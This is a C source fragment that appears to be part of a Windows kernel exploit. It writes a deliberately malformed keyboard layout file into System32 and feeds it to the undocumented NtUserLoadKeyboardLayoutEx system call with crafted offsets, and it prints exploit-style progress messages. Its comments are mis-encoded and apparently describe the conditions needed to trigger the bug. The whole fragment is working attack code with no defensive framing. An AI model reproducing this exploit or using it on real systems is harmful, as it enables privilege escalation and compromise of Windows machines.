VOID boom_loadlayout()
{
      
  KEYBDINPUT      kb={0};
  INPUT           vInput={0};

  HANDLE          hFile;
  DWORD           dwFuckS0ny;

  HKL             hKbd;

  WCHAR           lpPath[MAX_PATH]={0};
  WCHAR           lpLayoutFile[MAX_PATH]={L"C:\\Windows\\System32\\lSp0wns.boom111"};

  LPVOID          lpShellPtr;


  
  
  //strcpy( lpLayoutFile, L"%lSp0wns.boom111", lpPath);
  
  hFile = CreateFileW(lpLayoutFile,
    GENERIC_READ|GENERIC_WRITE,
    FILE_SHARE_READ|FILE_SHARE_WRITE,
    0,
    CREATE_ALWAYS,
    0,0);

  if( hFile == INVALID_HANDLE_VALUE )
  {
    printf(" \n[!!] Error:errorcode:%x\n",GetLastError());
    exit(0);
  }

  WriteFile(  hFile,
    fakeDll2,
    sizeof(fakeDll2)-1,
    &dwFuckS0ny,
    NULL);
  //printf("\n[+] Writing malformed kbd layout file \n\t\"%S\"\n\t[ %d ] bytes written\n",lpLayoutFile,dwFuckS0ny);
  CloseHandle(hFile);

  hFile = CreateFileW (lpLayoutFile,
    GENERIC_READ,
    FILE_SHARE_READ,
    0,
    OPEN_EXISTING,
    0,0);

  if( hFile == INVALID_HANDLE_VALUE )
  {
    printf(" \n[!!] Error\n");
    exit(0);
  }
  hKbd = GetKeyboardLayout( GetWindowThreadProcessId( GetForegroundWindow(), &dwFuckS0ny ) );
  printf("\n[+] Loading it...[ 0x%x ]\n", NtUserLoadKeyboardLayoutEx( hFile, 0x0160,0x01AE,&uKerbordname, hKbd, &uStr, 0x666, 0x101 ) );// 0x101 
  /*HKL NTAPI NtUserLoadKeyboardLayoutEx  (  IN HANDLE   Handle,
  IN DWORD   offTable,
  IN PUNICODE_STRING   puszKeyboardName,
  IN HKL   hKL,
  IN PUNICODE_STRING   puszKLID,
  IN DWORD   dwKLID,
  IN UINT   Flags   
  )  */
  //win7ÏÂÃæÕâ¸öº¯ÊýÊÇ¸ö²ÎÊýÀ´ÆäÖÐoffTable²ð·Ö³É¸ö
  //ÎÄ¼þÒ»¶¨Òª·ÅÔÚsystem32Ä¿Â¼ÏÂÃæ²»È»´¥·¢²»ÁË


  CloseHandle(hFile);
  //printf("\n[+] Done\n");
}